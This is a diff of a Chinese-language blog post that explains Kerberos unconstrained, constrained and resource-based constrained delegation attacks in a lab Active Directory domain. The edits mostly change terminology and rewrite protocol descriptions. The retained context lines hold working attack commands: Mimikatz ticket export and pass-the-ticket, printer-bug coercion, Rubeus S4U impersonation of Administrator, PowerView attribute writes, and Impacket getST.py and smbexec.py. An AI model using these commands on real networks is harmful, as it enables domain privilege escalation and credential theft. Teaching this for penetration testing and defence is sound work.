@@ -25,24 +25,24 @@ layout: post
 在非约束性委派（Unconstrained Delegation）中，服务账号可以获取域用户的 TGT，并使用该 TGT 模拟域用户访问任意服务。配置了非约束性委派的账户的 `userAccountControl` 属性会设置 `TRUSTED_FOR_DELEGATION` 标志位。下图所示为非约束性委派的完整请求过程。
 
 ![](/assets/posts/2022-03-12-domain-delegation-attack/ZGSOItJ8XLEjR19.png)
-```
-（1）域用户的机器向密钥分发中心（KDC）发送 KRB_AS_REQ 消息，并请求可转发的 TGT 1。
-（2）KDC 在 KRB_AS_REP 消息中返回一个可转发的 TGT 1，该 TGT 1 用于后续访问服务1（Service 1）使用。
-（3）用户根据步骤（2）中的可转发 TGT 1 请求转发 TGT 2，该过程通过 KRB_TGS_REQ 消息完成。
-（4）KDC 在 KRB_TGS_REP 消息中为用户返回一个转发的 TGT 2，该 TGT 2 用于后续访问服务2（Service 2）使用。
-（5）用户使用步骤（2）中返回的 TGT 1 向 KDC 请求 Service 1 的服务票据，该过程通过 KRB_TGS_REQ 消息完成。
-（6）TGS 票据授予服务在 KRB_TGS_REP 消息中为用户返回 Service 1 的服务票据（ST 1）。
-（7）用户通过发送 KRB_AP_REQ 消息向 Service 1 发出访问请求，同时提供 ST 1、可转发的 TGT 1、TGT 2 以及 TGT 2 的会话密钥（Session Key）。
-（8）为了满足用户的请求，Service 1 需要代表用户执行一些操作。Service 1 使用转发的 TGT 2 并将其通过 KRB_TGS_REQ 消息发送到 KDC，以用户的名义请求 Service 2 的 ST 2。
-（9）KDC 在 KRB_TGS_REP 消息中将 Service 2 的 ST 2 连同 Service 1 可以使用的 Session Key 一起返回给 Service 1。需要注意的是，这里返回的 ST 2 将客户端标识为用户，而不是 Service 1。
-（10）Service 1 以用户的身份通过 KRB_AP_REQ 消息向 Service 2 发出访问请求。
-（11）Service 2 响应 Service 1 的访问请求。
-（12）在得到 Service 2 的响应后，Service 1 现在可以响应用户在步骤（7）中发出的访问请求了。
-（13）此处描述的 TGT 转发委派机制不限制 Service 1 使用转发的 TGT。 Service 1 可以以用户的名义向 KDC 索要任何其他服务的票据。
-（14）KDC 将返回请求的服务票据。
-（15）然后，Service 1 可以继续使用用户的身份访问其他服务。
-（16）Service N 将响应 Service 1，就好像它是用户的进程一样。
-```
+
+上图描述了以下协议步骤：
+
+> 1. 用户通过发送 KRB_AS_REQ 消息向密钥分发中心（KDC）进行身份验证，并请求一个可转发的 TGT（Forwardable TGT）。
+> 2. KDC 在 KRB_AS_REP 消息中返回一个可转发的 TGT（Forwardable TGT）。
+> 3. 用户基于步骤 2 中获得的可转发 TGT（Forwardable TGT）请求一个转发的 TGT（Forwarded TGT）。这是通过 KRB_TGS_REQ 消息完成的。
+> 4. KDC 在 KRB_TGS_REP 消息中为用户返回一个转发的 TGT（Forwarded TGT）。
+> 5. 用户使用步骤 2 中返回的 TGT（Forwardable TGT）请求一个 Service 1 的服务票证。这是通过 KRB_TGS_REQ 消息完成的。
+> 6. 票证授予服务（TGS）在 KRB_TGS_REP 中返回 Service 1 的服务票证。
+> 7. 用户通过发送 KRB_AP_REQ 消息请求 Service 1，并提供服务票证、转发的 TGT（Forwarded TGT）和转发 TGT 的会话密钥。
+> 8. 为了满足用户的请求，Service 1 需要 Service 2 代表用户执行某些操作。Service 1 将用户提供的转发的 TGT （Forwarded TGT）放在 KRB_TGS_REQ 消息中发送给 KDC，要求为用户获取 Service 2 的服务票证。
+> 9. KDC 在 KRB_TGS_REP 消息中返回一个 Service 2 的票证给 Service 1，并提供一个 Service 1 可以使用的会话密钥。该票证将客户标识为用户，而不是 Service 1。
+> 10. Service 1 通过 KRB_AP_REQ，以用户的身份向 Service 2 发出请求。
+> 11. Service 2 响应。
+> 12. Service 1 可以使用该响应来回应用户在步骤 7 中的请求。
+> 13. 如此描述的 TGT 转发委派机制不会限制 Service 1 对转发 TGT 的使用。Service 1 可以要求 KDC 以用户的名义获取任何其他服务的票证。
+> 14. KDC 将返回请求的票证。
+> 15. Service 1 然后可以继续以用户的身份冒充其他服务。这可能会带来风险，例如，如果 Service 1 被入侵，Service 1 可以继续冒充合法用户向其他服务请求。
 
 从攻击的角度来看，当域管理员用户访问 Service 1 时，KDC 会检查 Service 1 服务账号的 `userAccountControl` 属性，发现 Service 1 服务配置了非约束性委派时，会进行上述认证过程。如果 Service 1 受到威胁，最终控制 Service 1 攻击者将获得域管理员用户的 TGT。 
 
@@ -89,7 +89,7 @@ C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType
 
 ![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331183734196.png)
 
-（2)接着，当域管理员通过 WinRM 等方式远程连接 WIN10-CLIENT1 主机时，WIN10-CLIENT1 主机的内存中将保存域管理员用户 Administrator 的 TGT。我们可以通过 Mimikatz 导出进行查看，相关命令如下，导出来的票据如下图所示。
+（2)接着，当域管理员通过 WinRM 等方式远程连接 WIN10-CLIENT1 主机时，WIN10-CLIENT1 主机的内存中将保存域管理员用户 Administrator 的 TGT。我们可以通过 Mimikatz 导出进行查看，相关命令如下，导出来的票证如下图所示。
 
 ```console
 C:\Users\Marcus\Desktop> mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
@@ -97,7 +97,7 @@ C:\Users\Marcus\Desktop> mimikatz.exe "privilege::debug" "sekurlsa::tickets /exp
 
 ![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331214823931.png)
 
-（3）如上图所示，可以看到域管理员账户的高权限TGT票据 `[0;13a0f0]-2-0-60a10000-Administrator@krbtgt-PENTEST.COM.kirbi`，执行以下命令，通过 Mimikatz 传递该票据。
+（3）如上图所示，可以看到域管理员账户的高权限TGT票证 `[0;13a0f0]-2-0-60a10000-Administrator@krbtgt-PENTEST.COM.kirbi`，执行以下命令，通过 Mimikatz 传递该票证。
 
 ```console
 C:\Users\Marcus\Desktop> mimikatz.exe "kerberos::ptt [0;13a0f0]-2-0-60a10000-Administrator@krbtgt-PENTEST.COM.kirbi" exit
@@ -155,7 +155,7 @@ C:\Users\Marcus\Desktop> SpoolSample.exe DC01 WIN10-CLIENT1
 
 ![](/assets/posts/2022-03-12-domain-delegation-attack/cux2kU4gthjXOiz.png)
 
-直接使用 Rubeus 传递该 Base64 编码后的票据：
+直接使用 Rubeus 传递该 Base64 编码后的票证：
 
 ```console
 C:\Users\Marcus\Desktop> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
@@ -170,21 +170,22 @@ C:\Users\Marcus\Desktop> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
 
 因为非约束委派的不安全性，约束委派（Constrained Delegation）应运而生。在 Widnows Server 2003 之后微软引入了非约束委派。同时，为了顺利进行约束性委派，微软为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议 S4u2self（Service for User to Self）和 S4U2proxy（Service for User to Proxy）。
 
-S4U2self 扩展允许服务代表用户获取针对自己的服务票据，S4U2proxy 允许服务代表用户获取另一个服务的服务票据。约束委派就是限制了 S4U2proxy 扩展的请求范围，使得配置了委派属性的服务只能模拟用户身份访问特定的其他服务。配置了约束性委派的账户的 `userAccountControl` 属性会设置 `TRUSTED_TO_AUTH_FOR_DELEGATION` 标志位，并且账户的 `msDS-AllowedToDelegateTo` 属性会被设置为对哪些服务进行委派。下图所示为约束性委派中，S4U2self 和 S4U2proxy 扩展的完整请求过程。
+S4U2self 扩展允许服务代表用户获取针对自己的服务票证，S4U2proxy 允许服务代表用户获取另一个服务的服务票证。约束委派就是限制了 S4U2proxy 扩展的请求范围，使得配置了委派属性的服务只能模拟用户身份访问特定的其他服务。配置了约束性委派的账户的 `userAccountControl` 属性会设置 `TRUSTED_TO_AUTH_FOR_DELEGATION` 标志位，并且账户的 `msDS-AllowedToDelegateTo` 属性会被设置为对哪些服务进行委派。下图所示为约束性委派中，S4U2self 和 S4U2proxy 扩展的完整请求过程。
 
 ![](/assets/posts/2022-03-12-domain-delegation-attack/q1dGC3syUAfR29w.png)
-```
-（1）域用户的机器向 Service 1 发出请求。用户通过了身份验证，但 Service 1 中没有用户的所需要的授权数据。该过程通常是由 Kerberos 认证以外的其他认证方式执行的。
-（2）假设 Service 1 已通过 KDC 进行身份验证并获得其 TGT，此时其可以通过 S4U2self 扩展代表指定用户向 KDC 请求针对自身服务的票据。
-（3）KDC 会返回一个发往 Service 1 的服务票据 ST 1，就好像它是使用用户自己的 TGT 请求的一样。服务票据可能包含用户的授权数据。
-（4）Service 1 可以使用服务票据中的授权数据来响应并满足用户在步骤（1）中的请求。值得注意的是，尽管 S4U2self 向 Service 1 提供有关用户的信息，但此扩展不允许 Service 1 代表用户提出针对其他服务的请求。这就轮到后面 S4U2proxy 扩展发挥作用了，S4U2proxy 在上图所示的下半部分进行了描述。
-（5）域用户的机器向 Service 1 发出请求。Service 1 需要以用户身份访问 Service 2 上的资源。但是，Service 1 没有来自用户的可转发 TGT ，因此不能通过非约束委派中转发 TGT 的方式执行委派。
-（6）此时，Service 1 通过 S4U2proxy 扩展代表指定用户向 KDC 请求 Service 2 的服务票据。该过程中，用户由 Service 1 的服务票据 ST 1 中的客户端名称和客户领域标识，要返回的票据的授权数据也从服务票证 ST 1 中复制。
-（7）如果请求中包含特权属性证书 (PAC)，则 KDC 会通过检查 PAC 结构的签名数据来验证 PAC。如果 PAC 有效或不存在，KDC 会向 Service 1 返回 Service 2 的服务票据 ST 2，但存储在服务票据的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 Service 1 的身份。
-（8）Service 1 使用 ST 2 向 Service 2 发出请求。Service 2 将此请求视为来自用户，并假定用户此时已通过 KDC 身份验证。
-（9）Service 2 响应 Service 1 在步骤（8）中的请求。
-（10）Service 1 响应用户在步骤（5）中的请求。
-```
+
+上图描述了以下协议步骤：
+
+> 1. 用户的机器向 Service 1 发出请求。用户已通过身份验证，但 Service 1 没有用户的授权数据。通常这是因为身份验证是通过 Kerberos 以外的其他方式进行的。
+> 2. Service 1 已经通过 KDC 进行身份验证并获得其 TGT，并使用 S4U2self 扩展代表指定用户请求一个到自身的服务票证。用户通过 S4U2self 数据中的用户名和用户的领域名称进行标识。或者，如果 Service 1 拥有用户的证书，它可以使用 PA-S4U-X509-USER 结构通过证书向 KDC 标识用户。
+> 3. KDC 返回一个地址为 Service 1 的服务票证，就像它是由用户使用自己的 TGT 请求的一样。服务票证可能包含用户的授权数据。
+> 4. Service 1 可以使用服务票证中的授权数据来满足用户的请求，然后响应用户。虽然 S4U2self 为 Service 1 提供了关于用户的信息，但该扩展不允许 Service 1 代表用户向其他服务发出请求，那是 S4U2proxy 的作用。S4U2proxy 在上图中的下半部分中描述。
+> 5. 用户的机器向 Service 1 发出请求。Service 1 需要以用户的身份访问 Service 2 上的资源。然而，Service 1 没有用户提供的转发的 TGT（Forwarded TGT）来执行转发 TGT 的委派，如前一节中描述 Kerberos 转发 TGT 进行委派的图所示。此步骤有两个前提条件。首先，Service 1 已经通过 KDC 进行身份验证并拥有有效的 TGT。其次，Service 1 拥有一个从用户到 Service 1 的可转发的服务票证（Forwardable TGS）。该可转发的服务票证（Forwardable TGS）可能是通过 KRB_AP_REQ 消息获得的，或通过 S4U2self 请求获得的。
+> 6. Service 1 代表指定用户请求一个到 Service 2 的服务票证。用户通过 Service 1 的服务票证中的客户名和客户领域进行标识。要返回的票证中的授权数据也从 Service 1 的服务票证中复制。
+> 7. 如果请求中有权限属性证书（PAC），则 KDC 通过检查 PAC 结构的签名数据来验证 PAC。如果 PAC 有效或不存在，则 KDC 返回一个 Service 2 的服务票证，但服务票证中的 cname 和 crealm 字段存储的是用户的身份，而不是 Service 1 的。
+> 8. Service 1 使用服务票证向 Service 2 发出请求。Service 2 将此请求视为来自用户，并假设用户已通过 KDC 认证。
+> 9. Service 2 对请求作出响应。
+> 10. Service 1 对用户在消息 5 中的请求作出响应。
 
 从攻击的角度来看，如果 Service 1 受到威胁，由于 Service 1 配置了到 Service 2 的约束性委派，则攻击者可以利用 Service 1 代表域管理员用户访问 Service 2。如果 Service 2 位于域控制器，例如域控的 CIFS、LDAP 等服务，那么就可以直接获取域控制器权限。
 
@@ -227,7 +228,7 @@ C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType
 
 （1）首先，通过 Marcus 用户登录域成员主机 WIN10-CLIENT1，尝试通过 DCSync 导出域内用户哈希，结果失败。
 
-（2）然后，通过 Rubeus 申请机器账户 WIN10-CLIENT1 的 TGT，相关命令如下。执行后，将得到 Base64 加密后的 TGT 票据，如下图所示。
+（2）然后，通过 Rubeus 申请机器账户 WIN10-CLIENT1 的 TGT，相关命令如下。执行后，将得到 Base64 加密后的 TGT 票证，如下图所示。
 
 ```console
 C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:WIN10-CLIENT1$ /rc4:5dd934ddeff076dd686656a2a7d6081b /domain:pentest.com /dc:DC01.pentest.com /nowrap
@@ -240,7 +241,7 @@ C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:WIN10-CLIENT1$ /rc4:5dd934ddeff
 
 ![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331220531127.png)
 
-（3)然后执行以下命令，使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中，执行结果如下图所示。
+（3)然后执行以下命令，使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票证，并将得到的票证传递到内存中，执行结果如下图所示。
 
 ```console
 C:\Users\Marcus\Desktop> Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC01.pentest.com /dc:DC01.pentest.com /ptt /ticket:<Base64EncodedTicket>
@@ -260,7 +261,7 @@ C:\Users\Marcus\Desktop> Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:
 
 可以将基于资源的约束性委派理解为传统的约束性委派的反向过程。以 Service 1 和 Service 2 两个服务为例，传统的约束性委派需要在 Service 1 上设置 msDS-AllowedToDelegateTo 属性，以指定对 Service 2 上的哪一个服务进行委派。二在基于资源的约束性委派中，需要在 Service 2 上将 msDS-AllowedToActOnBehalfOfOtherIdentity 属性值设为 Service 1 的 SID，以允许 Service 1 对 Service 2 上的服务进行委派。
 
-此外，在传统的约束性委派中，通过 S4u2self 申请到的 ST 票据一定是可转发的，如果不可转发，则后续的 S4U2Proxy 阶段将失败。但是在基于资源的约束性委派中，不可转发的 ST 票据仍然可以通过 S4U2Proxy 阶段对其他服务进行委派认证。因此，基于资源的约束性委派与传统的约束性委派在利用方法上大同小异。
+此外，在传统的约束性委派中，通过 S4u2self 申请到的 ST 票证一定是可转发的，如果不可转发，则后续的 S4U2Proxy 阶段将失败。但是在基于资源的约束性委派中，不可转发的 ST 票证仍然可以通过 S4U2Proxy 阶段对其他服务进行委派认证。因此，基于资源的约束性委派与传统的约束性委派在利用方法上大同小异。
 
 ### RBCD Attack
 
@@ -330,7 +331,7 @@ Get-DomainComputer DC01 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
 Set-DomainObject DC01 -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Verbose
 ```
 
-（4）接下来就是传统约束性委派攻击的流程了。通过 Rubeus 申请机器账户 WIN10-CLIENT1 的 TGT，相关命令如下。执行后，将得到 Base64 加密后的 TGT 票据，如下图所示。
+（4）接下来就是传统约束性委派攻击的流程了。通过 Rubeus 申请机器账户 WIN10-CLIENT1 的 TGT，相关命令如下。执行后，将得到 Base64 加密后的 TGT 票证，如下图所示。
 
 ```console
 C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:PENTEST$ /password:Passw0rd /domain:pentest.com /dc:DC01.pentest.com /nowrap
@@ -343,7 +344,7 @@ C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:PENTEST$ /password:Passw0rd /do
 
 ![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331220856516.png)
 
-（3)然后执行以下命令，使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中，执行结果如下图所示。
+（3)然后执行以下命令，使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票证，并将得到的票证传递到内存中，执行结果如下图所示。
 
 ```console
 C:\Users\Marcus\Desktop> Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC01.pentest.com /dc:DC01.pentest.com /ptt /ticket:<Base64EncodedTicket>
@@ -404,19 +405,19 @@ python3 printerbug.py pentest.com/Marcus:Marcus\@123@172.26.10.13 172.26.10.134
 
 ![](/assets/posts/2022-03-12-domain-delegation-attack/r8G7sHd61cSCQWT.png)
 
-（4）接着，通过 Impacket 套件中的 getST.py 执行基于资源的约束性委派攻击，并获取用于访问 WIN2016-WEB1 机器上 CIFS 服务的高权限票据，如图下所示。
+（4）接着，通过 Impacket 套件中的 getST.py 执行基于资源的约束性委派攻击，并获取用于访问 WIN2016-WEB1 机器上 CIFS 服务的高权限票证，如图下所示。
 
 ```bash
 python3 getST.py pentest.com/PENTEST\$:Passw0rd -spn CIFS/WIN2016-WEB1.pentest.com -impersonate Administrator -dc-ip 172.26.10.11
 
-# -spn 指定创建的票据要认证到的服务 SPN  
+# -spn 指定创建的票证要认证到的服务 SPN  
 # -impersonate 指定要通过 S4U 代表的用户  
 # -dc-ip 指定域控制器的 IP 地址  
 ```
 
 ![](/assets/posts/2022-03-12-domain-delegation-attack/OULbGYMhfg1eiVy.png)
 
-（5）最后，通过设置环境变量 `KRB5CCNAME` 来使用该票据，并通过 smbexec.py 获取 WIN2016-WEB1 机器的最高权限，相关命令如下，执行结果如下图所示。在执行以下命令之前，需要将 Kali Linux 的 /etc/resolv.conf 中 DNS 服务器改为域控制器的 IP 地址。
+（5）最后，通过设置环境变量 `KRB5CCNAME` 来使用该票证，并通过 smbexec.py 获取 WIN2016-WEB1 机器的最高权限，相关命令如下，执行结果如下图所示。在执行以下命令之前，需要将 Kali Linux 的 /etc/resolv.conf 中 DNS 服务器改为域控制器的 IP 地址。
 
 ```bash
 export KRB5CCNAME=Administrator.ccache
